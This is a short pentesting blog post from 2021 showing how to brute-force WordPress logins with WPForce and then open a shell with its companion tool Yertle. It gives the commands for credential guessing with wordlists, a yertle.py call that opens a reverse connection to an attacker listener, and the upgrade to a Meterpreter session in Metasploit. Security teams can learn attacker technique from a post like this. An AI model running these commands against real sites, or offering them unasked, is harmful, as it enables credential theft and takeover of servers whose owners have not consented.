---
title:  "Reverse Shell in Wordpress with WPForce"
date:   2021-08-08 18:20:00 +0000
categories: [techniques]
tags: [web exploitation, wordpress]
---


Reverse Shell in Wordpress with WPForce and Yertle

Imagine the scenario where you are presented with a WordPress site during a pentest and want to get in.   
Standard 'author?' requests don't give you the name of any users and you need to look else where.   
One nice alternative to using WPScan to brute force the username and password field is WPForce.   
Taken from the WPForce website, link: [WPFORCE](https://www.n00py.io/category/pentesting 'WP-FORCE')


"
Unlike WPScan, which performs brute force login attempts against the login page of WordPress, WPForce uses authenticated API calls to test the validity of credentials.  While most security plugins are wise to this method, it does provide slightly more stealth.
"


So first, clone yourself a copy of WPForce

`git clone https://github.com/n00py/WPForce.git`

Once downloaded, parse the user, password and website deatils:

`python wpforce.py -i usr.txt -w pass.txt -u "http://www.[website].com"`

Once the script completes hopefully the Username and Password is dicovered. However if not choose different word-lists that are more appropriate to your scenario, maybe you get lucky.


![img-description](/images/WPForce-1.png)
_executing the script_

![img-description](/images/WPForce-2.png)
_Example of a PAssword Found sucessfully_

Having figured out the username and password to a Wordpress CMS site and now want to gain a shell.   

Normally you would either have to circumvent the upload restrictions on the Wordpress page, which can be time consuming with a lot of trial and error or disguise an upload file within a custom built plugin. Again something potentially time consuming to achieve, this is where WPForce comes in.    

WPForce is a useful tool that will create an interactive shell or a reverse TCP connection to a meterpreter listener. It also has lots of other interesting features like hooking to the BEEF Framework.    

To start with, make sure you have the python 'Requests' HTTP libraries installed, you can install them using PIP.   

`pip install requests`

Now we are set lets start..   

`Arguments - -t URL, -u username, -p password, -v verbose, -li localhost, -lp localport, -r reverse or -i interactive, -a User Agent.`

`python yertle.py -t http://192.168.0.122/wordpress -u admin -p admin -v -li 192.168.0.100 -lp 80 -r`

![img-description](/images/Yertle-1.png)
_Executing The Script_

From here we have an interactive shell with limited functionality.   

![img-description](/images/Yertle-2.png)
_Interactive Shell_

A simple directory listing from within the web server from an interactive shell.   

![img-description](/images/Yertle-3.png)
_Interactive Shell_

Now setup a Meterpreter listener to wait for our connection.   

![img-description](/images/Yertle-5.png)
_Interactive Shell_

Now we simply type 'meterpreter' and add the IP and Port details.   

![img-description](/images/Yertle-6.png)
_Interactive Shell_

We receive the meterpreter session in metasploit.   

![img-description](/images/Yertle-7.png)
_Interactive Shell_

Now we can continue our enumeration from Metasploit.   
